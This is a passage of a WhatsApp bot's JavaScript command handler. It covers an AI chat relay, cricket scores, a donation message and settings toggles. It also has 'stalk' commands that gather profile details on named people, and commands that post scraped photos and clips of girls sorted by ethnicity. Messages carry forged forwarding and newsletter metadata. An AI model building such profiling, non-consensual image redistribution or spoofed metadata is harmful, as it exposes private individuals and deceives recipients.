          return await VeranBotInc.sendText(m.chat, "An error occurred while fetching the phone details. Please try again.");
        }
      }
      break;
      

case 'alexa': {
    // Get the user input text
    let queryText = args.join(' ');

    // Check if queryText is provided
    if (!queryText) {
        return await VeranBotInc.sendText(m.chat, "Please provide a message for Alexa.");
    }

    // Define the API URL with the user's query
    const apiUrl = `https://ultimetron.guruapi.tech/rekha?prompt=${encodeURIComponent(queryText)}`;

    // Fetch data from the API
    let response;
    try {
        response = await fetch(apiUrl);
        let data = await response.json();

        if (!data.result || !data.result.response) {
            return await VeranBotInc.sendText(m.chat, "Failed to get a response from Alexa. Please try again.");
        }

        let reply = data.result.response;

        // Create the message with design
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: reply
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false,
                            ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{\"display_text\":\"🔄 Try Again\",\"id\":\"retry_button\"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '100000000000000000@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        // Send the message
        return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
    } catch (error) {
        console.error('API Fetch Error:', error);
        return await VeranBotInc.sendText(m.chat, "An error occurred while processing your request.");
    }
}
break;


//-------------------------------------------------------------------------------------------------//

//Cricket Cmds

//cricket
case 'matches':
  case 'match':
  case 'cricket':
    {
      let res = await fetchJson(`https://api-smd.onrender.com/api/match`);
      const matches = res.results;
      console.log(matches);

      let outputMessage = ""; // Initialize the output message
      matches.forEach((match) => {
        // Change 'matches' to 'match'
        outputMessage += `* ${match.title}\n`;
        outputMessage += `* URL: ${match.link}\n`;
      });
      replygcveran(
        `${outputMessage}\n\nType *${prefix}score cricbuzz link* to get detailed result...`
      );
    }
    break;

  case 'scores':
  case 'score':
    {
      if (!args[0]) {
        return replygcveran(
          `Cricbuzz match Link is required. Type *${prefix}matches* to get links...`
        );
      }
      let res = await fetchJson(
        `https://api-smd.onrender.com/api/score?url=${args[0]}`
      );
      if (res.error) {
        ("No Data Found or Invalid URL...");
      }
      let txt = `*${res.results.names}*\n\n${res.results.details[0]}\n${res.results.details[1]}\n${res.results.details[2]}\n\n*Summary*: ${res.results.preview}`;
      replygcveran(txt);
    }
    break;


    //-------------------------------------------------------------------------------------------//

   
    
    //--------------------------------------------------------------------------------------------//

    case 'sc': case 'script': case 'donate': case 'support': case 'cekupdate': case 'updatebot': case 'appreciate': case 'sourcecode': {
let me = m.sender
let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 🥺 *7082664317 opay or 7082664317 smartcash* 
*TON WALLET TRANSFER*

*_UQCPfaLxU1KYsBFc8qWkiAgXEjGzAJE1ewTgnCEccnjmF4U6_*`
sendVeranBotIncMessage(m.chat, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./VTHmedia/theme/VthPic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'runtime': case 'uptime': case 'active': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcveran(lowq)
            	}
            break
			case 'xruntime': case 'testx': case 'xbot': {
				if (text && text.startsWith('--') && VeranTheCreator) {
					let buttonnya = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT',
							sections: [{
								title: 'Bot Settings',
								rows: [
									{ title: 'Anti Call On🟢', description: 'Activate Anti Call', id: '.bot anticall on' },
									{ title: 'Anti Call Off🔴', description: 'Turn off Anti Call', id: '.bot anticall off' },
									{ title: 'Auto Bio On🟢', description: 'Enable Auto Bio', id: '.bot autobio on' },
									{ title: 'Auto Bio Off🔴', description: 'Turn off Auto Bio', id: '.bot autobio off' },
									{ title: 'Auto Read On🟢', description: 'Enable Auto Read', id: '.bot autoread on' },
									{ title: 'Auto Read Off🔴', description: 'Turn off Auto Read', id: '.bot autoread off' },
									{ title: 'Auto Type On🟢', description: 'Enable Auto Type', id: '.bot autotype on' },
									{ title: 'Auto Type Off🔴', description: 'Turn off Auto Type', id: '.bot autotype off' },
									{ title: 'Read SW On🟢', description: 'Enable Read SW', id: '.bot antiswview on' },
									{ title: 'Read SW Off🔴', description: 'Turn off Read SW', id: '.bot antiswview off' },
								]
							}]
						}
					}]
					await VeranBotInc.sendButtonMsg(m.chat, 'Bot Settings', veranytimewisher, 'Please select Owner🫡', null, buttonnya, m);
				} else if (text && VeranTheCreator) {
					if (text === 'anticall on') db.settings[botNumber].anticall = true, replygcveran('Successfully Activating Anticall');
					if (text === 'anticall off') db.settings[botNumber].anticall = false, replygcveran('Successfully Turning Off Anticall');
					if (text === 'autobio on') db.settings[botNumber].autobio = true, replygcveran('Successfully Activating Autobio');
					if (text === 'autobio off') db.settings[botNumber].autobio = false, replygcveran('Successfully Turning Off Autobio');
					if (text === 'autoread on') db.settings[botNumber].autoread = true, replygcveran('Successfully Activating Autoread');
					if (text === 'autoread off') db.settings[botNumber].autoread = false, replygcveran('Successfully Turning Off Autoread');
					if (text === 'autotype on') db.settings[botNumber].autotyping = true, replygcveran('Successfully Activating Autotype');
					if (text === 'autotype off') db.settings[botNumber].autotyping = false, replygcveran('Successfully Turning Off Autotype');
					if (text === 'antiswview on') db.settings[botNumber].readsw = true, replygcveran('Successfully Activating Read SW');
					if (text === 'antiswview off') db.settings[botNumber].readsw = false, replygcveran('Successfully Turning Off Read SW');
					let settingsBot = Object.entries(db.settings[botNumber]).map(([key, value]) => {
						let qhk = (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
						return `${key.charAt(0).toUpperCase() + key.slice(1)} : ${qhk}`;
					}).join('\n');
					if (text === 'settings') replygcveran(settingsBot);
				} else {
					VeranBotInc.sendMessage(m.chat, { text: `*Bots Have Been Online For*\n*${runtime(process.uptime())}*` }, { quoted: m })
				}
			}
			break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcveran(`Example ${prefix+command} Veran350`)
await VeranStickWait()
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
VeranBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return replygcveran(`Example ${prefix+command} veranapi`)
await VeranStickWait()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
replygcveran(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
                
case 'ffstalk':{
if (!q) return replygcveran(`Example ${prefix+command} 946716486`)
await VeranStickWait()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
replygcveran(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
			case 'mlstalk': {
if (!q) return replygcveran(`Example ${prefix+command} 530793138|8129`)
await VeranStickWait()
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcveran(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'tiktokstalk': {
  if (!text) return replygcveran(`Please provide a TikTok username.`);

  const username = text;
  const apiUrl = `${global.api}stalking/tiktok-user2?apikey=${global.id}&user=${username}`;
  
  try {
    // Fetch TikTok user data
    let res = await fetchJson(apiUrl);
    
    if (!res.status) {
      await VeranBotInc.sendMessage(m.chat, { text: '❌ Unable to fetch data. Please try again later.' }, { quoted: m });
      return;
    }

    const user = res.result;
    let txt = `
┌──「 *TIKTOK STALK* 」
▢ *🔖 Name:* ${user.nickname}
▢ *🔖 Username:* ${user.username}
▢ *👥 Followers:* ${user.followerCount}
▢ *🫂 Following:* ${user.followingCount}
▢ *💖 Hearts:* ${user.heartCount}
▢ *📌 Description:* ${user.signature || 'No description available.'}
▢ *🔗 Link:* https://tiktok.com/${user.username}
└────────────`;

    // Send the message with user profile image
    await VeranBotInc.sendMessage(m.chat, { image: { url: user.avatarLarger }, caption: txt }, { quoted: m });

  } catch (error) {
    console.error('Error fetching TikTok user data:', error.message);
    await VeranBotInc.sendMessage(m.chat, { text: '❌ An error occurred while processing the request. Please try again later.' }, { quoted: m });
  }
}
break;

case 'telestalk': {
  if (!text) return replygcveran(`*Where is the Telegram Username?*\n_Example:_\n${prefix}${command} ahmmikun`);

  try {
    // Fetch Telegram user data using the provided API
    const apiUrl = `${global.api}stalking/telegram-user?apikey=${global.id}&user=${encodeURIComponent(text)}`;
    let api = await fetchJson(apiUrl);

    // Log the API response for debugging
    console.log('Telegram API Response:', api);

    if (!api || api.status !== 200 || !api.result) {
      console.error('API response is invalid or no results found:', api);
      await VeranBotInc.sendMessage(m.chat, '❌ No results found on Telegram. Please try again with a different username.', { quoted: m });
      return;
    }

    // Prepare the response message with user information
    const userInfo = `*📱 T E L E G R A M - U S E R 📱*\n\n` +
                     `• 👤 *Name*: ${api.result.name}\n` +
                     `• 🆔 *Username*: ${api.result.username}\n` +
                     `• 📜 *Bio*: ${api.result.bio}\n` +
                     `• 🔗 *Profile Photo*: ${api.result.photo}`;

    // Send the user info to the user
    await VeranBotInc.sendMessage(m.chat, { text: userInfo }, { quoted: m });

    // Send the Telegram user's profile photo
    await VeranBotInc.sendMessage(m.chat, {
      image: { url: api.result.photo },
      caption: `*Profile Photo of ${api.result.name}*`
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching Telegram data:', error.message);
    await VeranBotInc.sendMessage(m.chat, { text: '❌ An error occurred while fetching the Telegram data. Please try again later.' }, { quoted: m });
  }
}
break;


case 'wachannelstalk': case 'channel': case 'group': case 'link': case 'vc': {
  if (!text) return replygcveran(`*Here is the WhatsApp Channel link🤖*\n_Example:_\n${prefix}${command} *_https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s_*`);

  try {
    // Fetch WhatsApp channel data using the provided API
    const apiUrl = `${global.api}stalking/whatsapp-channel?apikey=${global.id}&url=${encodeURIComponent(text)}`;
    let api = await fetchJson(apiUrl);

    // Log the API response for debugging
    console.log('WhatsApp Channel API Response:', api);

    if (!api || api.status !== 200 || !api.result) {
      console.error('API response is invalid or no results found:', api);
      await VeranBotInc.sendMessage(m.chat, '❌ No results found on WhatsApp Channel. Please try again with a different URL.', { quoted: m });
      return;
    }

    // Prepare the response message with channel information
    const channelInfo = `*🌐 W H A T S A P P - C H A N N E L 🌐*\n\n` +
                        `• 🏷️ *Title*: ${api.result.title}\n` +
                        `• 📜 *Description*: ${api.result.description}\n` +
                        `• 👥 *Followers*: ${api.result.followers}\n` +
                        `• 🔗 *Channel Link*: ${text}`;

    // Send the channel info to the user
    await VeranBotInc.sendMessage(m.chat, { text: channelInfo }, { quoted: m });

    // Send the WhatsApp channel's image
    await VeranBotInc.sendMessage(m.chat, {
      image: { url: api.result.img },
      caption: `*Channel Image for ${api.result.title}*`
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching WhatsApp channel data:', error.message);
    await VeranBotInc.sendMessage(m.chat, { text: '❌ An error occurred while fetching the WhatsApp channel data. Please try again later.' }, { quoted: m });
  }
}
break;
			case 'tiktokgirl':{
await VeranStickWait()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokghea':{
await VeranStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokbocil':{
await VeranStickWait()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknukhty':{
await VeranStickWait()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoksantuy':{
await VeranStickWait()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokkayes':{
await VeranStickWait()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokpanrika':{
await VeranStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknotnot':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'chinese':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hijab':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'japanese':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'korean':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'malay':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
